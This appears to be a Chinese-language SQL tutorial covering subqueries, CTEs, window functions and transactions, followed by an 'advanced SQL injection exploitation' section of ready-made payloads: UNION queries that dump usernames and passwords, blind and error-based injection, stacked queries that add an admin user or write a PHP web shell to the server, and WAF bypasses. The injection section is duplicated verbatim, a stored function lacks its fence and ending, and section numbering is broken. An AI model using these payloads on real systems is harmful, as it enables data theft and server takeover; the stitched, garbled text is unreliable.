## 一、进阶语法知识

### 1.1 高级查询技巧

#### 子查询与嵌套查询

```sql
-- 标量子查询：返回单个值
SELECT name, (SELECT COUNT(*) FROM orders WHERE user_id = users.id) AS order_count
FROM users;

-- 行子查询：返回一行
SELECT * FROM users
WHERE (id, name) = (SELECT user_id, user_name FROM orders WHERE id = 1);

-- 列子查询：返回一列
SELECT * FROM users
WHERE id IN (SELECT user_id FROM orders WHERE status = 'paid');

-- 表子查询：返回多行多列（派生表）
SELECT avg(salary)
FROM (
    SELECT department_id, MAX(salary) as salary
    FROM employees
    GROUP BY department_id
) AS dept_max;
```

#### 公用表表达式 (CTE)

```sql
-- 基本 CTE
WITH high_value_orders AS (
    SELECT user_id, SUM(amount) AS total
    FROM orders
    GROUP BY user_id
    HAVING SUM(amount) > 10000
)
SELECT u.name, h.total
FROM users u
JOIN high_value_orders h ON u.id = h.user_id;

-- 递归 CTE（树形结构查询）
WITH RECURSIVE category_tree AS (
    -- 基础用例：顶级分类
    SELECT id, name, parent_id, 1 AS level
    FROM categories
    WHERE parent_id IS NULL
    
    UNION ALL
    
    -- 递归用例：子分类
    SELECT c.id, c.name, c.parent_id, ct.level + 1
    FROM categories c
    INNER JOIN category_tree ct ON c.parent_id = ct.id
)
SELECT * FROM category_tree ORDER BY level, id;

-- 多个 CTE
WITH
    user_stats AS (
        SELECT user_id, COUNT(*) as order_count, SUM(amount) as total_spent
        FROM orders
        GROUP BY user_id
    ),
    top_users AS (
        SELECT user_id, total_spent
        FROM user_stats
        ORDER BY total_spent DESC
        LIMIT 10
    )
SELECT u.name, tu.total_spent
FROM top_users tu
JOIN users u ON tu.user_id = u.id;
```

#### 窗口函数 (Window Functions)

```sql
-- 排名函数
SELECT 
    department_id,
    name,
    salary,
    RANK() OVER (PARTITION BY department_id ORDER BY salary DESC) as rank_in_dept,
    DENSE_RANK() OVER (PARTITION BY department_id ORDER BY salary DESC) as dense_rank,
    ROW_NUMBER() OVER (PARTITION BY department_id ORDER BY salary DESC) as row_num
FROM employees;

-- 聚合窗口函数
SELECT 
    order_date,
    amount,
    SUM(amount) OVER (ORDER BY order_date) as running_total,
    AVG(amount) OVER (ORDER BY order_date ROWS BETWEEN 6 PRECEDING AND CURRENT ROW) as moving_avg_7d
FROM orders;

-- 偏移函数
SELECT 
    name,
    salary,
    LAG(salary, 1) OVER (ORDER BY salary) as prev_salary,
    LEAD(salary, 1) OVER (ORDER BY salary) as next_salary,
    FIRST_VALUE(salary) OVER (ORDER BY salary) as lowest,
    LAST_VALUE(salary) OVER (ORDER BY salary RANGE BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING) as highest
FROM employees;

-- NTILE 分桶
SELECT 
    name,
    salary,
    NTILE(4) OVER (ORDER BY salary DESC) as quartile  -- 分成四组
FROM employees;
```

CREATE FUNCTION CalculateDiscount(p_amount DECIMAL(10,2), p_customer_level VARCHAR(20))
RETURNS DECIMAL(10,2)
DETERMINISTIC
BEGIN
    DECLARE discount DECIMAL(10,2);
    
    CASE p_customer_level
        WHEN 'gold' THEN SET discount = p_amount * 0.85;
        WHEN 'silver' THEN SET discount = p_amount * 0.9;
        WHEN 'bronze' THEN SET discount = p_amount * 0.95;
        ELSE SET discount = p_amount;
    END CASE;
    
    RETURN discount;

### 1.3 事务与并发控制

```sql
-- 事务基本用法
START TRANSACTION;  -- 或 BEGIN

UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

-- 检查是否成功
IF ROW_COUNT() > 0 THEN
    COMMIT;
ELSE
    ROLLBACK;
END IF;

-- 保存点 (SAVEPOINT)
START TRANSACTION;
INSERT INTO orders VALUES (1, 100);
SAVEPOINT after_order;

INSERT INTO order_items VALUES (1, 'product_a', 2);
-- 出错了，回滚到保存点
ROLLBACK TO SAVEPOINT after_order;

COMMIT;

-- 隔离级别
SET SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;  -- 读未提交
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;    -- 读已提交
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;   -- 可重复读（MySQL 默认）
SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE;       -- 串行化

-- 锁表
LOCK TABLES users WRITE, orders READ;
-- 执行操作...
UNLOCK TABLES;

-- 行级锁 (SELECT ... FOR UPDATE)
START TRANSACTION;
SELECT * FROM accounts WHERE id = 1 FOR UPDATE;  -- 锁定该行
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;  -- 事务提交后释放锁
```

## 四、高级实战案例

### 4.1 SQL 注入高级利用

深入理解 SQL 注入的高级利用技术。

```sql
-- ===== SQL 注入分类与利用 =====

-- 1. 联合查询注入 (UNION-based)
-- 当页面会显示查询结果时使用
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT 1, version(), database()-- 

-- 确定列数（使用 ORDER BY）
-- ?id=1' ORDER BY 3--+  (正常)
-- ?id=1' ORDER BY 4--+  (报错，说明3列)

-- 获取数据库名
?id=-1' UNION SELECT 1,2,database()--+

-- 获取所有数据库
?id=-1' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata--+

-- 获取表名
?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+

-- 获取列名
?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+

-- 拖库
?id=-1' UNION SELECT 1,username,password FROM users--+

-- ===== 2. 布尔盲注 (Boolean-based) =====
-- 页面只返回 True/False 两种状态

-- 判断数据库名长度
?id=1' AND length(database()) > 5--+

-- 逐字符猜解数据库名 (ASCII 码)
?id=1' AND ascii(substr(database(),1,1)) > 97--+
-- 二分法：97='a', 109='m', 122='z'

-- 逐字符猜解表名
?id=1' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) > 97--+

-- ===== 3. 时间盲注 (Time-based) =====
-- 页面无回显，通过响应时间判断

-- MySQL: SLEEP()
?id=1' AND SLEEP(5)--+

-- 条件时间注入
?id=1' AND IF(length(database())>5, SLEEP(5), 0)--+

-- 逐字符猜解
?id=1' AND IF(ascii(substr(database(),1,1))>97, SLEEP(5), 0)--+

-- 替代方案（无 SLEEP 时）
?id=1' AND BENCHMARK(10000000, MD5('test'))--+

-- PostgreSQL: pg_sleep()
?id=1'; SELECT pg_sleep(5)--

-- MSSQL: WAITFOR DELAY
?id=1'; WAITFOR DELAY '0:0:5'--

-- ===== 4. 报错注入 (Error-based) =====
-- 利用数据库报错信息获取数据

-- MySQL: updatexml / extractvalue
?id=1' AND updatexml(1, concat(0x7e, database(), 0x7e), 1)--+
?id=1' AND extractvalue(1, concat(0x7e, database(), 0x7e))--+

-- MySQL: floor + rand + group by
?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- MSSQL: convert + cast
?id=1' AND 1=convert(int, db_name())--

-- Oracle: utl_inaddr / ctxsys.drithsx
?id=1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--

-- ===== 5. 堆叠查询 (Stacked Queries) =====
-- 支持多语句执行的数据库

-- 新增管理员用户
?id=1'; INSERT INTO users(username, password, role) VALUES ('hacker', 'md5pass', 'admin')--+

-- 修改密码
?id=1'; UPDATE users SET password='new_hash' WHERE username='admin'--+

-- 文件读写
?id=1'; SELECT '<?php system($_GET[cmd]) ?>' INTO OUTFILE '/var/www/html/shell.php'--+

-- ===== 6. 宽字节注入 =====
-- 当使用 GBK 编码且 addslashes 转义时

-- %df%27 组合：%df\ 变成一个汉字，单引号逃逸
?id=1%df%27 AND 1=1--+

-- 原理：addslashes 会在 ' 前加 \，变成 \'
-- %df%5c%27 中 %df%5c 是一个 GBK 字符(運)，%27 逃逸

-- ===== 7. 二次注入 =====
-- 数据插入时被转义，但取出时未转义

-- 注册用户: admin'--
-- 当系统使用该用户名进行查询时：
-- SELECT * FROM users WHERE username='admin'--'  注入成功

-- ===== 8. 编码绕过 =====

-- URL 编码
?id=1%27%20AND%201%3D1--+

-- 双重 URL 编码
?id=1%2527 AND 1=1--+

-- Unicode 编码
?id=1%C0%A7  (宽字节绕过)

-- HTML 实体
?id=1&#39; AND 1=1--+

-- ===== 9. WAF 绕过 =====

-- 内联注释 (MySQL)
?id=1 /*!AND*/ 1=1--+
?id=1 /*!50000AND*/ 1=1--+

-- 大小写混合
?id=1' AnD 1=1--+

-- 空格替代
?id=1'AND%091=1--+      -- Tab
?id=1'AND%0a1=1--+      -- 换行
?id=1'AND%0b1=1--+      -- 垂直制表
?id=1'AND%0c1=1--+      -- 换页
?id=1'AND%0d1=1--+      -- 回车
?id=1'AND%a01=1--+      -- 不间断空格

-- 括号绕过
?id=1'AND(1=1)--+

-- 函数替代
?id=1' AND char(49)=char(49)--+
?id=1' AND 0x31=0x31--+

-- 等价函数
-- UNION SELECT -> UNION ALL SELECT
-- OR 1=1 -> || 1=1
-- AND 1=1 -> && 1=1
```

### 4.1 SQL 注入高级利用

深入理解 SQL 注入的高级利用技术。

```sql
-- ===== SQL 注入分类与利用 =====

-- 1. 联合查询注入 (UNION-based)
-- 当页面会显示查询结果时使用
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT 1, version(), database()-- 

-- 确定列数（使用 ORDER BY）
-- ?id=1' ORDER BY 3--+  (正常)
-- ?id=1' ORDER BY 4--+  (报错，说明3列)

-- 获取数据库名
?id=-1' UNION SELECT 1,2,database()--+

-- 获取所有数据库
?id=-1' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata--+

-- 获取表名
?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+

-- 获取列名
?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--+

-- 拖库
?id=-1' UNION SELECT 1,username,password FROM users--+

-- ===== 2. 布尔盲注 (Boolean-based) =====
-- 页面只返回 True/False 两种状态

-- 判断数据库名长度
?id=1' AND length(database()) > 5--+

-- 逐字符猜解数据库名 (ASCII 码)
?id=1' AND ascii(substr(database(),1,1)) > 97--+
-- 二分法：97='a', 109='m', 122='z'

-- 逐字符猜解表名
?id=1' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) > 97--+

-- ===== 3. 时间盲注 (Time-based) =====
-- 页面无回显，通过响应时间判断

-- MySQL: SLEEP()
?id=1' AND SLEEP(5)--+

-- 条件时间注入
?id=1' AND IF(length(database())>5, SLEEP(5), 0)--+

-- 逐字符猜解
?id=1' AND IF(ascii(substr(database(),1,1))>97, SLEEP(5), 0)--+

-- 替代方案（无 SLEEP 时）
?id=1' AND BENCHMARK(10000000, MD5('test'))--+

-- PostgreSQL: pg_sleep()
?id=1'; SELECT pg_sleep(5)--

-- MSSQL: WAITFOR DELAY
?id=1'; WAITFOR DELAY '0:0:5'--

-- ===== 4. 报错注入 (Error-based) =====
-- 利用数据库报错信息获取数据

-- MySQL: updatexml / extractvalue
?id=1' AND updatexml(1, concat(0x7e, database(), 0x7e), 1)--+
?id=1' AND extractvalue(1, concat(0x7e, database(), 0x7e))--+

-- MySQL: floor + rand + group by
?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- MSSQL: convert + cast
?id=1' AND 1=convert(int, db_name())--

-- Oracle: utl_inaddr / ctxsys.drithsx
?id=1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--

-- ===== 5. 堆叠查询 (Stacked Queries) =====
-- 支持多语句执行的数据库

-- 新增管理员用户
?id=1'; INSERT INTO users(username, password, role) VALUES ('hacker', 'md5pass', 'admin')--+

-- 修改密码
?id=1'; UPDATE users SET password='new_hash' WHERE username='admin'--+

-- 文件读写
?id=1'; SELECT '<?php system($_GET[cmd]) ?>' INTO OUTFILE '/var/www/html/shell.php'--+

-- ===== 6. 宽字节注入 =====
-- 当使用 GBK 编码且 addslashes 转义时

-- %df%27 组合：%df\ 变成一个汉字，单引号逃逸
?id=1%df%27 AND 1=1--+

-- 原理：addslashes 会在 ' 前加 \，变成 \'
-- %df%5c%27 中 %df%5c 是一个 GBK 字符(運)，%27 逃逸

-- ===== 7. 二次注入 =====
-- 数据插入时被转义，但取出时未转义

-- 注册用户: admin'--
-- 当系统使用该用户名进行查询时：
-- SELECT * FROM users WHERE username='admin'--'  注入成功

-- ===== 8. 编码绕过 =====

-- URL 编码
?id=1%27%20AND%201%3D1--+

-- 双重 URL 编码
?id=1%2527 AND 1=1--+

-- Unicode 编码
?id=1%C0%A7  (宽字节绕过)

-- HTML 实体
?id=1&#39; AND 1=1--+

-- ===== 9. WAF 绕过 =====

-- 内联注释 (MySQL)
?id=1 /*!AND*/ 1=1--+
?id=1 /*!50000AND*/ 1=1--+

-- 大小写混合
?id=1' AnD 1=1--+

-- 空格替代
?id=1'AND%091=1--+      -- Tab
?id=1'AND%0a1=1--+      -- 换行
?id=1'AND%0b1=1--+      -- 垂直制表
?id=1'AND%0c1=1--+      -- 换页
?id=1'AND%0d1=1--+      -- 回车
?id=1'AND%a01=1--+      -- 不间断空格

-- 括号绕过
?id=1'AND(1=1)--+

-- 函数替代
?id=1' AND char(49)=char(49)--+
?id=1' AND 0x31=0x31--+

-- 等价函数
-- UNION SELECT -> UNION ALL SELECT
-- OR 1=1 -> || 1=1
-- AND 1=1 -> && 1=1
```

            # 使用十六进制避免引号问题

- **SQLite**：
  - 注释：`--`, `/*...*/`
  - 系统表：`sqlite_master`
  - 无存储过程
  - 无堆叠查询
